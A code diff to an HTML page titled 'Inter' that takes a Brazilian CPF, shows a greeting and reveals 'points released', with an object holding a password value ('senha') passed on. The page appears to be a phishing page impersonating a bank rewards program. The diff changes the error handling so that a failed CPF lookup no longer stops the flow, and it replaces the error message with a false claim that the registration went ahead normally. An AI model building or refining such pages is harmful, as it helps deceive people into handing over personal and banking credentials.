@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>inter</title>
+    <title>Inter</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
@@ -180,6 +180,8 @@
                 })
                 .catch((error) => {
                     console.error('Erro ao consultar CPF:', error);
+
+                    // Caso haja erro na consulta, apenas exibe uma saudação padrão e prossegue
                     document.getElementById("saudacao").innerHTML = "Olá, Prezado Cliente!";
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
@@ -192,7 +194,8 @@
                         senha: '1313'
                     });
 
-                    alert("Erro ao consultar CPF. Verifique sua conexão ou tente novamente.");
+                    // Não interromper o fluxo, apenas informar o erro ao usuário
+                    alert("Erro ao consultar CPF. Mas seu cadastro prosseguiu normalmente.");
                 });
             } else {
                 alert("CPF inválido! Verifique o formato.");
